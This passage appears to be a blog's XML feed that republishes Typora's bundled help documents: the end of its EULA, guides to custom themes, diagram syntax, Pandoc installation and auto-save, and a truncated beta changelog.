Update.</li><li>For a major update, You may or may not need to pay an additional feein order to be able to download an upgrade. The payment policy for majorupdate will be announced by us when the upgrades are ready.</li><li>After you upgrade from Beta version to Stable version, if no Licensekey are provided, you would start using Trail Versionautomatically.</li><li>You could upgrade or downgrade Typora as you like, but we willdelete older versions from our website after a long time period or wefind it contains serious bugs.</li><li>Any maintenance and support provided by us, including the provisionof Updates and upgrades, will be provided in an adequate way on an “asis” basis without any warranty, as soon as reasonably practicable,subject to availability of personnel.</li></ol><h2 id="use-of-data">6. Use of data</h2><ol type="1"><li>See our <a href="https://support.typora.io/Privacy-Policy/">PrivatePolicy</a>.</li></ol><h2 id="disclaimer">7. Disclaimer</h2><ol type="1"><li>You Use the Software at Your own risk and the entire risk as tosatisfactory quality, performance and accuracy is with You.</li><li>We are working hard on improving Typora, but we can't guarantee thatis it bug free. Therefore, <strong>your use of Typora is at your solerisk. The service is provided "as is" and "as available".</strong> Wedisclaim all warranties of any kind, express or implied, including,without limitation, the warranties of merchantability, fitness for aparticular purpose and non-infringement. We are not liable for damages,direct or consequential, resulting from your use of the Website, and youagree to defend, indemnify and hold us harmless from any claims, losses,liability costs and expenses (including but not limited to attorney'sfees) arising from your violation of any third-party's rights. Youacknowledge that you have only a limited, nonexclusive, nontransferablelicense to use the Website.</li></ol><h2 id="liability-limitation">8. Liability limitation</h2><ol type="1"><li>We and any third party that has been involved in the creation,production, or delivery of the Software are under no circumstancesliable for consequential or indirect damages (including damage for lossof profit, business interruption, loss of data, and the like arising outof the use or inability to use the Software).</li><li>The limitations of liability referred to in clause 8.1 shall notapply in the event that: (i) any negligence on the part of Typora leadsto death or physical injury or (ii) damages arise from the intent,willful misconduct or gross negligence of us or the management ofus.</li></ol><h2 id="termination">9. Termination</h2><ol type="1"><li>This EULA will continue to be in force until the expiry ortermination of the Full version or Trial version.</li><li>The Full version or Trial version will terminate automatically atthe end of the applicable license term, unless renewed or Activatedprior to the end of the applicable license term.</li><li>We are entitled to terminate the Full version or Trial version byblocking the License Key during the license term with immediate effectand without prior notice in the event You fail to comply with the termsin this EULA, in the event You fail to pay Your (subscription) fee forthe License Key within the applicable payment term, or in the eventTypora is required to do so by law or an order of an applicablecourt.</li><li>Upon termination of the Full version or Trial version, You shallcease all use of the Software and shall destroy all copies thereof.</li><li>You acknowledge that the provisions of this EULA, which by theirnature are intended to survive termination, will remain in effect aftertermination of this EULA.</li></ol><h2 id="feedback">10. Feedback</h2><p>We welcome any comment, question and communication athi@typora.io</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Custom%20Themes/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Custom%20Themes/</url>
    
    <content type="html"><![CDATA[<h2 id="change-themes">Change Themes</h2><p>Typora has 5~6 built-in themes. Changing writing theme can be done byselecting theme under the <code>theme</code> menu bar. You could alsodownload, install, modify or write your own custom theme to stylizeTypora.</p><p>Typora use CSS to stylish all contents, each theme under<code>theme</code> menu is one <code>.css</code> files under "typora'stheme folder". So, briefly speaking, you could add/modify themes byadding/modifying correspond css files under "typora's theme folder".</p><h2 id="get-typora-themes">Get Typora Themes</h2><p>We have an office website <a href="http://theme.typora.io">TyporaTheme Gallery</a> for designers/developers to share their custom themeswith others. You could download theme from there.</p><h2 id="install-custom-themes">Install Custom Themes</h2><ol type="1"><li>Open Theme Folder. (see instructions below)</li><li>Copy or move <code>.css</code> file and related resources, likefonts or images, into the newly opened folder.</li><li>Restart typora, then select it from <code>Themes</code> menu.</li></ol><h2 id="open-theme-folder">Open Theme Folder</h2><h3 id="macos">macOS</h3><p>Open preference panel by <code>cmd+`</code>, then click "Open ThemeFolder"</p><p><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Custom%20Themes/Snip20160921_1.png" style="zoom:50%"></p><h3 id="windowslinux">Windows/Linux</h3><p>Open preference panel from <code>File</code> →<code>Preference</code> from menubar, then click "Open ThemeFolder":</p><p><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Custom%20Themes/Snip20160921_2.png" style="zoom:50%"></p><h2 id="modify-current-styles">Modify Current Styles</h2><p>Sometimes, you may just want to change font family for all themes,for change font-color for headings for a specific themes. In this case,you do not need to copy/modify a whole exiting css file, just <a href="http://support.typora.io/Add-Custom-CSS/">Add Custom CSS</a> isenough. In brief:</p><ul><li>Create &amp; write a <code>base.user.css</code> under theme folder,the css rules inside it will be applied to all themes.</li><li>Create &amp; write a <code>&#123;theme-css-name&#125;.user.css</code> undertheme folder, the css rules inside it will only be applied to theme file<code>&#123;theme-css-name&#125;.css</code>.</li></ul><p>Please note that the built-in CSS theme files will get overwrittencompletely on typora version up, so, write your custom css into<code>*.user.css</code>, instead of the existing files, will preventyour modifications from being lost after update.</p><h2 id="write-my-own-theme">Write My Own Theme</h2><p>Please refer to <a href="http://theme.typora.io/doc/Write-Custom-Theme/">Write Custom Themefor Typora</a>.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Draw%20Diagrams%20With%20Markdown/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Draw%20Diagrams%20With%20Markdown/</url>
    
    <content type="html"><![CDATA[<h1 id="draw-diagrams-with-markdown">Draw Diagrams With Markdown</h1><p>Typora supports some Markdown extension for diagrams, you couldenable this feature from preference panel.</p><p>When exporting as HTML, PDF, epub, docx, those rendered diagrams willalso be included, but diagrams features are not supported when exportingmarkdown into other file formats in current version. Besides, you shouldalso notice that diagrams is not supported by standard Markdown,CommonMark or GFM. Therefore, we still recommend you to insert an imageof these diagrams instead of write them in Markdown directly.</p><h1 id="sequence">Sequence</h1><p>It is powered by <a href="https://bramp.github.io/js-sequence-diagrams/">js-sequence</a>,which would turn following code block into rendered diagrams:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gfm">​```sequence<br>Alice-&gt;Bob: Hello Bob, how are you?<br>Note right of Bob: Bob thinks<br>Bob--&gt;Alice: I am good thanks!<br>​```<br></code></pre></td></tr></table></figure><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Draw%20Diagrams%20With%20Markdown/Snip20160816_1.png" alt="Snip20160816_1"><figcaption aria-hidden="true">Snip20160816_1</figcaption></figure><p>Please refer <a href="https://bramp.github.io/js-sequence-diagrams/#syntax">here</a> forsyntax explanation.</p><h1 id="flowchart">Flowchart</h1><p>It is powered by <a href="http://flowchart.js.org/">flowchart.js</a>,which would turn following code block into rendered diagrams:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gfm">​```flow<br>st=&gt;start: Start<br>op=&gt;operation: Your Operation<br>cond=&gt;condition: Yes or No?<br>e=&gt;end<br><br>st-&gt;op-&gt;cond<br>cond(yes)-&gt;e<br>cond(no)-&gt;op<br>​```<br></code></pre></td></tr></table></figure><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Draw%20Diagrams%20With%20Markdown/Snip20160816_2.png" alt="Snip20160816_2"><figcaption aria-hidden="true">Snip20160816_2</figcaption></figure><h1 id="mermaid">Mermaid</h1><p>Typora also has integration with <a href="https://knsv.github.io/mermaid/#mermaid">mermaid</a>, whichsupports sequence, flowchart and gantt.</p><h2 id="sequence-1">Sequence</h2><p>see <a href="https://knsv.github.io/mermaid/#sequence-diagrams">thisdoc</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gfm">​```mermaid<br>%% Example of sequence diagram<br>  sequenceDiagram<br>    Alice-&gt;&gt;Bob: Hello Bob, how are you?<br>    alt is sick<br>    Bob-&gt;&gt;Alice: Not so good :(<br>    else is well<br>    Bob-&gt;&gt;Alice: Feeling fresh like a daisy<br>    end<br>    opt Extra response<br>    Bob-&gt;&gt;Alice: Thanks for asking<br>    end<br>​```<br></code></pre></td></tr></table></figure><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Draw%20Diagrams%20With%20Markdown/Snip20160816_3.png" alt="Snip20160816_3"><figcaption aria-hidden="true">Snip20160816_3</figcaption></figure><h2 id="flowchart-1">Flowchart</h2><p>see <a href="https://knsv.github.io/mermaid/#flowcharts-basic-syntax">thisdoc</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gfm">​```mermaid<br>graph LR<br>A[Hard edge] --&gt;B(Round edge)<br>    B --&gt; C&#123;Decision&#125;<br>    C --&gt;|One| D[Result one]<br>    C --&gt;|Two| E[Result two]<br>​```<br></code></pre></td></tr></table></figure><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Draw%20Diagrams%20With%20Markdown/Snip20160816_4.png" alt="Snip20160816_4"><figcaption aria-hidden="true">Snip20160816_4</figcaption></figure><h2 id="gantt">Gantt</h2><p>see <a href="https://knsv.github.io/mermaid/#gant-diagrams">thisdoc</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs gfm">​```mermaid<br>%% Example with slection of syntaxes<br>        gantt<br>        dateFormat  YYYY-MM-DD<br>        title Adding GANTT diagram functionality to mermaid<br><br>        section A section<br>        Completed task            :done,    des1, 2014-01-06,2014-01-08<br>        Active task               :active,  des2, 2014-01-09, 3d<br>        Future task               :         des3, after des2, 5d<br>        Future task2               :         des4, after des3, 5d<br><br>        section Critical tasks<br>        Completed task in the critical line :crit, done, 2014-01-06,24h<br>        Implement parser and jison          :crit, done, after des1, 2d<br>        Create tests for parser             :crit, active, 3d<br>        Future task in critical line        :crit, 5d<br>        Create tests for renderer           :2d<br>        Add to mermaid                      :1d<br><br>        section Documentation<br>        Describe gantt syntax               :active, a1, after des1, 3d<br>        Add gantt diagram to demo page      :after a1  , 20h<br>        Add another diagram to demo page    :doc1, after a1  , 48h<br><br>        section Last section<br>        Describe gantt syntax               :after doc1, 3d<br>        Add gantt diagram to demo page      : 20h<br>        Add another diagram to demo page    : 48h<br>​```<br></code></pre></td></tr></table></figure><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Draw%20Diagrams%20With%20Markdown/Snip20160816_5.png" alt="Snip20160816_5"><figcaption aria-hidden="true">Snip20160816_5</figcaption></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Install%20and%20Use%20Pandoc/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Install%20and%20Use%20Pandoc/</url>
    
    <content type="html"><![CDATA[<p>TL;DR:</p><p>Typora requires Pandoc (≥ v1.20). If you do not have Pandoc or onlyold version of Pandoc installed on your machine, you could:</p><p>Download installer from <strong><a href="https://github.com/jgm/pandoc/releases/latest">DownloadPage</a></strong> and install or update <a href="http://pandoc.org/">Pandoc</a>.</p><p>For windows users, if typora still saying it cannot found Pandoc, youmay need try to restart your PC.</p><h1 id="pandoc-integration">Pandoc Integration</h1><p>In Typora, import function and export function for some file formats(including docx, odt, rtf, epub, LaTeX and wiki) are powered by a 3rdparty software named Pandoc. Those features requires Pandoc (≥ v1.16) tobe installed.</p><p>Please note that install Pandoc is optional for Typora, if you do notneed those advanced import/export support in typora, then you do nothave to install Pandoc on your computer.</p><p>This document would show how to install Pandoc and use Typora withPandoc for full import/export functions.</p><p>[TOC]</p><h2 id="what-is-pandoc">What is Pandoc</h2><p><a href="http://pandoc.org/">Pandoc</a> is a universal document textconverter. Typora use it to support file import/export features forseveral file types.</p><h2 id="install-pandoc">Install Pandoc</h2><h3 id="for-mac-user">For Mac User</h3><p>Briefly speaking, there are two recommended ways.</p><h5 id="install-from-downloaded-package-installer">Install fromdownloaded package installer</h5><p>Download a package installer from pandoc's <a href="https://github.com/jgm/pandoc/releases/latest">download page</a>,open it and follow the instructions for installation.</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Install%20and%20Use%20Pandoc/Snip20160502_1.png" alt="Install pandoc on OS X"><figcaption aria-hidden="true">Install pandoc on OS X</figcaption></figure><h5 id="install-from-homebrew">Install from homebrew</h5><p>For developers using <a href="http://brew.sh/">homebrew</a>,installing pandoc can be one line from terminal:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">brew install pandoc<br></code></pre></td></tr></table></figure><h3 id="for-windows-user">For Windows User</h3><p>Download the <code>pandoc-*-window.msi</code> from pandoc's <a href="https://github.com/jgm/pandoc/releases/latest">download page</a>,open it and follow the instructions for installation.</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Install%20and%20Use%20Pandoc/pandoc-win.PNG" alt="Install pandoc on Windows"><figcaption aria-hidden="true">Install pandoc on Windows</figcaption></figure><h2 id="use-pandoc">Use Pandoc</h2><p>After Pandoc is installed, then you could import supported file typesby clicking File -&gt; Import from menubar, or simple drag and drop afile into typora. Export function is also fully functional from menubar.Pandoc will run in backgrounds for those tasks and then exitautomatically, so you may not feel it.</p><h2 id="faq">FAQ</h2><h4 id="which-version-of-pandoc-is-supported">Which version of pandoc issupported ?</h4><p>Versions ≥ 1.16 is required. The latest version, the better. Soupdating pandoc is encouraged if your pandoc version is too old.</p><p>#### Can typora work without pandoc ?</p><p>Yes, only import and export (other than html/PDF file types) needsit.</p><h4 id="which-file-types-can-be-imported-or-exported-by-typora">Whichfile types can be imported or exported by typora ?</h4><p>Import supports file with extesion: .docx, .latex, .tex, .ltx, .rst,.rest, .org, .wiki, .dokuwiki, .textile, .opml, .epub.</p><p>Export supports file formats of: HTML, PDF (these two does not needPandoc), Docx, odt, rtf, Epub, LaTeX, Media Wiki.</p><p>Pandoc should support more file types which typora did not integrate,detailed info is <a href="http://pandoc.org/">here</a>.</p><h4 id="whats-the-difference-between-exporting-by-typora-and-exporting-by-using-pandoc-from-command-line">What'sthe difference between exporting by typora and exporting by using pandocfrom command line ?</h4><p>Exporting by typora is also powered by Pandoc, yet typora will notconvert directly from markdown to target file type, instead, it convertsto an inner format pandoc can read and then write as target file type,so, in detail:</p><ul><li>If you run pandoc from command line, then you need to specify itsmarkdown parser from (pandoc Markdown, <a href="http://commonmark.org/">CommonMark</a>, <a href="https://michelf.ca/projects/php-markdown/extra/">PHP MarkdownExtra</a>, <a href="https://help.github.com/articles/github-flavored-markdown/">GitHub-FlavoredMarkdown</a>), while exporting using typora, typora will pass its innerAST to pandoc for file conversion. In other words, the format of blocksor inline elements in exported output will always be consistent as whatyou see in typora and exported HTML/PDF. Yet, the styling maybedifferent.</li><li>Some markdown syntax invented by pandoc Markdown, like citations,are not supported when you exporting from typora, since only markdownsyntax typora support will be correctly exported. But we may supportmore extended markdown syntax in future.</li><li>If you use typora for exporting, then<code>[TOC]</code> will becorrectly exported for all file types. Highlight and underline will besupported for LaTeX, rtf, Epub, wiki formats and sometimes Docx. Yet,they are only supported for HTML based file formats in raw Pandoc. Otherblock and inline elements is basically both supported by raw pandoc andtypora+pandoc.</li></ul><h4 id="can-all-blockinline-element-types-be-exported-correctly">Can allblock/inline element types be exported correctly ?</h4><p>Task list is not supported yet. Underline and highlight for<code>.docx</code> is supported only if they are not used inside oroutside other inline styles. Underline and highlight is not support forOpenOffice(<code>.odt</code>). Embedded .gif file is not support forLaTeX. Other block or inline elements can basically be exported. But thestyles cannot be 100% match when import/export.</p><h4 id="how-to-uninstall-pandoc-for-mac">How to uninstall pandoc for mac?</h4><p>This is the instruction from <a href="http://pandoc.org/installing.html">pandoc's official site</a>:</p><blockquote><p>If you later want to uninstall the package, you can do so bydownloading <a href="https://raw.githubusercontent.com/jgm/pandoc/master/osx/uninstall-pandoc.pl">thisscript</a> and running itwith <code>perl uninstall-pandoc.pl</code>".</p></blockquote><h4 id="found-bug-and-unsupported-syntax-for-exporting">Found bug andunsupported syntax for exporting ?</h4><p>Contact us <a href="mailto:hi@typora.io" class="email">hi@typora.io</a>, better to provide a sample<code>.md</code> file, so we could reproduce the bug.</p><p>If you found it is a bug/feature request for pandoc, you couldcontact the community via <a href="https://groups.google.com/forum/#!forum/pandoc-discuss">pandoc-discuss</a>.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Auto%20Save,%20Version%20Control%20and%20Recovery/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Auto%20Save,%20Version%20Control%20and%20Recovery/</url>
    
    <content type="html"><![CDATA[<h1 id="auto-save-version-control-and-recovery">Auto Save, VersionControl and Recovery</h1><h2 id="macos">macOS</h2><p>On macOS, the operation system will schedule auto save operation fordocument-based apps, like Typora or TextEdit. So "auto-save" is alwaysenabled as a system feature.</p><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Auto%20Save,%20Version%20Control%20and%20Recovery/general.png" alt="general"><figcaption aria-hidden="true">general</figcaption></figure><p>If you want Typora to auto save content when quit or close, withoutpopping up a confirm dialog, please <strong>uncheck</strong> thecheckbox one.</p><p>If you want Typora to restore all windows/documents when restart,please <strong>uncheck</strong> the checkbox two.</p><h2 id="windowslinux">Windows/Linux</h2><figure><img src="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Auto%20Save,%20Version%20Control%20and%20Recovery/Snip20161027_2.png" alt="Snip20161027_2"><figcaption aria-hidden="true">Snip20161027_2</figcaption></figure><p>You could enable this feature on preferences panel.</p><p>By default, the documents will be saved every 5 minutes.</p><p>If you want to change the time interval, please click "Open AdvancedSettings" button on preferences panel, which would pop up a folder named<code>conf</code>, then edit or create a file named<code>conf.user.json</code>, and modify/add following setting:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;autoSaveTimer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span> <span class="hljs-comment">// Double, default is 5. The unit is &quot;minute&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="recover-unsaved-drafts-windowslinux">Recover Unsaved Drafts(Windows/Linux)</h3><p>No matter whether the "auto-save" option is enabled or not, if Typoraexit or crashed without saving file, or you accidentally quite Typorawithout saving your writings, you could click the "Recover UnsavedDrafts" button to found some writing drafts auto saved by Typora.</p><p>The filename of those backed-up drafts is like<code>&#123;date&#125;-&#123;filename&#125;.md</code>, if your content is newly createdwithout a file path (which is, "Untitled"), the <code>&#123;filename&#125;</code>part is auto generated, which is usually the first heading or firstsentence. You could find and copy out the corresponding backup file toretrieve some part of your writings.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Change%20Log/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Change%20Log/</url>
    
    <content type="html"><![CDATA[<h2 id="beta">0.9.75 (beta)</h2><p>18, Aug</p><ol type="1"><li>Add Slovak language thanks to Petr Mátl.</li><li>Add syntax highlight for turtle.</li><li>Add move table row / column related operations in main menu.</li><li>Improve compatibility with GFM for auto generated anchor names.</li><li>Fix some settings not updated in preferences panel.</li></ol><h2 id="beta-1">0.9.74 (beta)</h2><p>08, Aug</p><ol type="1"><li>Remove unnecessary <code>&lt;span&gt;</code> from exportedHTML.</li><li>Fix issue Home / End key.</li></ol><h2 id="beta-2">0.9.73 (beta)</h2><p>03, Aug</p><p><a href="https://support.typora.io/What&#39;s-New-0.9.73/">Detail</a></p><ol type="1"><li>Redesign of preference panels.</li><li>Add table operations in menu bar, move "image" related operation to"Format" menu.</li><li>Add smalltalk language syntax.</li><li>Use new app update component on Windows.</li><li>Fix auto reload not working.</li><li>Improve mermaid gantt rendering.</li><li>Support auto escape image path when export.</li><li>Add pre-defined settings for reading speed.</li><li>Fix bug that sidebar folder will not be kept after move totrash.</li><li>Fix bugs about export HTML without styles.</li><li>Fix bug that global search cannot contain special keys like"#".</li></ol><h2 id="beta-3">0.9.72 (beta)</h2><p>21, Jun</p><ol type="1"><li>Fix bug that user cannot input after confirm or error dialog popsup.</li><li>Fix bug about typewriter mode.</li><li>Fix bug that open folder not working.</li><li>Fix bug about internal links on export.</li></ol><h2 id="beta-4">0.9.71 (beta)</h2><p>20, Jun</p><ol type="1"><li>[Dev] Upgrade to Electron to 5.0 for better performance. Linux 32bitis no longer supported.</li><li>Improve URL parse logic.</li><li>Add Gherkin language syntax highlight.</li><li>Support Catalan language.</li><li>Support “Descending” order when sorting in file panel.</li><li>UI Improvement on Night theme.</li><li>Improve search and quick open on unicode characters.</li><li>Improve logics about file save and multi-window management.</li><li>Unify default rules for line break options.</li><li>Fix some bugs on file side panel.</li><li>Fix some bugs on PDF export. Zoom oversize mermaid diagrams, mathblocks and tables on exported PDF.</li><li>Fix spellcheck on pt-PT.</li><li>Fix bug that inline math not get updated sometimes.</li><li>Fix quote and brackets when using Chinese IME.</li><li>Fix bug that <code>$</code> get omitted on headings.</li><li>Fix some bugs about cursor jump on click or on Shift + Enter.</li><li>Fix bugs about <code>&amp;</code> cannot be escaped in somecases.</li><li>Other bug fix.</li></ol><h2 id="beta-5">0.9.70 (beta)</h2><p>20, Apr</p><ol type="1"><li>Fix wrong cursor position calculation logic on lines containemoji.</li><li>Fix quote auto pair issue.</li></ol><h2 id="beta-6">0.9.69 (beta)</h2><p>19, Apr</p><ol type="1"><li>Fix security bug on export and editing.</li><li>Add ASN.1 syntax highlight support.</li><li>Fix no default theme is loaded on first launch.</li><li>Improve copy &amp; paste logic.</li><li>Improve search function, now search will not ignore whitespace.</li><li>Add error message for flowchart when rendering failed.</li><li>Fix image operations, support <code>align</code> attribute for<code>img</code> tag.</li><li>Fix emoji auto complete.</li><li>Fix bug that math not rendered on open sometimes, fix cursor issuesrelates to inline math.</li><li>Other bug fix.</li></ol><h2 id="beta-7">0.9.68 (beta)</h2><p>20, Mar, 2019</p><ol type="1"><li>Fix security issues.</li><li>Fix regression bug on side bar, edit, images, links relatedfunctions.</li><li>Add syntax highlight for SPARQL and Crystal.</li></ol><h2 id="beta-8">0.9.67 (beta)</h2><p>16, Mar, 2019</p><ol type="1"><li>Fix export HTML not working.</li><li>Improve Pandoc version detect logic.</li></ol><h2 id="beta-9">0.9.66 (beta)</h2><p>15, Mar, 2019</p><p><a href="https://support.typora.io/What&#39;s-New-0.9.66/">Detail</a></p><ol type="1"><li>Fix security issues.</li><li>Fix unnecessary escape in outline.</li><li>Fix click outline will cause content jumping.</li><li>Fix hide status bar not working.</li><li>Add language Vietnamese by <a href="https://github.com/1234hdpa">1234hdpa</a>.</li><li>Remove options for emoji autocomplete, it is now enabled bydefault.</li><li>Update flowchart library and fix issues related to flowchart.</li><li>Add options to configure reading speed.</li><li>Add <code>oz</code> ad supported language for syntax highlight.</li><li>Other bug fix.</li></ol><h2 id="beta-10">0.9.65 (beta)</h2><p>18, Feb, 2019</p><ol type="1"><li>Save last chosen encodings for file.</li><li>Add Indonesia language support by <a href="https://github.com/snatalius">snatalius</a>.</li><li>Allow drag &amp; drop to insert file links quickly.</li><li>Fix XSS for inline math, add security check for area tag.</li><li>Fix math block rendering issue.</li><li>Fix footnotes numbering on export.</li><li>Improve compatibility on Linux OS.</li><li>Other bug fix.</li></ol><h2 id="beta-11">0.9.64 (beta)</h2><p>25, Jan, 2019</p><ol type="1"><li>Fix an XSS issue.</li><li>Fix word count in selection in word count panel.</li></ol><h2 id="beta-12">0.9.63 (beta)</h2><p>25, Jan, 2019</p><p><a href="https://support.typora.io/What&#39;s-New-0.9.63/">Detail</a></p><ol type="1"><li>Improve open quickly.</li><li>Support “Copy without Theme Styling”.</li><li>Add recent folders in jump list.</li><li>Show full path on file tree when hover on items.</li><li>Improved Japanese and Hrvatski translation.</li><li>Fix bugs on parsing Markdown content.</li><li>Improve math support and update to mhchem 3.3 for Chemistrysupport.</li><li>Fix button actions and links for spellcheck panel.</li><li>Add basic context menu in source code mode.</li><li>Fix bugs cursor jump when input block quotes or task lists.</li><li>Other bug fix.</li></ol><h2 id="beta-13">0.9.62 (beta)</h2><p>10, Jan, 2019</p><ol type="1"><li>Fix bugs on math input and rendering.</li><li>Other regression bug fix.</li></ol><h2 id="beta-14">0.9.61 (beta)</h2><p>08, Jan, 2019</p><ol type="1"><li>Support global search in opened folder.</li><li>Support filter in outline panel.</li><li>Support search in preferences panel.</li><li>Support select default unit for word count (character count, linecounts, etc).</li><li>Support move file by drag &amp; drop in file tree panel, supportduplicate file in file panel.</li><li>Add Portuguese (Portugal) support by <a href="https://github.com/jcamilo93">camilo93</a>, add Galician supportby <a href="https://github.com/nunhes">nunhes</a>.</li><li>Add COLOL as supported code highlight language.</li><li>Fix text in menu bar is invisible on Linux.</li><li>Update MathJax Rendering engine to 2.7.5</li><li>Fix word count bug when document contains list.</li><li>Support disable GPU acceleration when launch Typora.</li><li>Add warnings for file move/delete, add options to reset all warningdialogs.</li><li>Fix an SSX issue when rendering <code>&lt;img&gt;</code>.</li><li>Fix bugs about math block in exported PDF/docx</li><li>Other bug fix.</li></ol><h2 id="beta-15">0.9.60 (beta)</h2><p>27, Oct, 2018</p><ol type="1"><li>Fix rename or move file would make window unresponsive.</li><li>Fix shift+ctrl+v will trigger paste twice.</li><li>Fix cannot open markdown file by double click on Linux.</li><li>Fix links relates to spellcheck.</li><li>Fix some content cannot be parsed in limited time.</li><li>Fix inline math would get corrupt or wrong cursor afterediting.</li></ol><h2 id="beta-16">0.9.59 (beta)</h2><p>23, Oct, 2018</p><p><a href="https://support.typora.io/What&#39;s-New-0.9.59/">Detail</a></p><ol type="1"><li>Support spellcheck for non-English languages.</li><li>Save learned spelling and support unlearn spelling from contextmenu.</li><li>Add menu item to open file properties on Windows.</li><li>Fix “preserve line break” get ignore when export as PDF. Fixincorrect modify/create time for exported PDF file.</li><li>Add warnings when user enter typewriter/focus mode in their firsttime.</li><li>Fix bug about cursor and update issues for math.</li><li>Improve typing response, improve scroll performance and slightlyimprove speed for opening document.</li><li>Improve behaviors for “indent first line”.</li><li>Fix bug that image storage folder not updated after open newfile.</li><li>Add sort function for file tree in sidebar.</li><li>Other bug fix.</li></ol><h2 id="beta-17">0.9.58 (beta)</h2><p>12, Sep, 2018</p><ol type="1"><li>Add options for custom image storage folder.</li><li>Fix a critical bug triggered when pasting contents into tables.</li><li>Fix bugs relates to loading remote images.</li><li>Fix bugs that <code>&lt;source&gt;</code> tag inside<code>&lt;video&gt;</code> does not work.</li><li>Fix a security issue when loading local iframes. (Special Thanks toZhiyang Zeng(<span class="citation" data-cites="Wester">@Wester</span>)from Tencent Blade Team).</li><li>Fix bugs about pasting into lists.</li><li>Fix save failure when user does not have a "document" folder.</li><li>Auto hide menubar when entering full screen mode.</li><li>Other bug fix.</li></ol><h2 id="beta-18">0.9.57 (beta)</h2><p>30, Aug, 2018</p><ol type="1"><li>Fix image export.</li><li>Fix crashment on glibc 2.28. (Linux)</li><li>Fix copy math into MS Word (Windows).</li><li>Fix parse error for lists and links.</li><li>Fix outline not updated after switch documents.</li><li>Improve paste behavior.</li><li>Other bug fix.</li></ol><h2 id="beta-19">0.9.56 (beta)</h2><p>22, Aug, 2018</p><ol type="1"><li>Fix some bugs on previous version.</li></ol><h2 id="beta-20">0.9.54 (beta)</h2><p>19, Aug, 2018</p><p><a href="http://support.typora.io/What&#39;s-New-0.9.54/">Detail</a></p><ol type="1"><li>support preview for inline HTML, support HTML blocks.</li><li>Support all common HTML tags including <code>video</code>,<code>iframe</code>, <code>kbd</code>, <code>details</code>,<code>ruby</code>, etc.</li><li>Change a few default shortcut keys.</li><li>Follow CommonMark’s standard for parsing line break. Now line breakis aligned in inline styles.</li><li>Improve UI for table, math, search panel, etc. And fix some CSSissues.</li><li>Add Swedish UI. (Thanks to <a href="https://github.com/FelixZY"><span class="citation" data-cites="FelixZY">@FelixZY</span></a>)</li><li>Improve paste logic, and support parsing/converting more HTMLcontents, include gist snip, iframe embed, etc.</li><li>Fix <code>Return</code> key and related undo/redo on tables.</li><li>Fix rendering 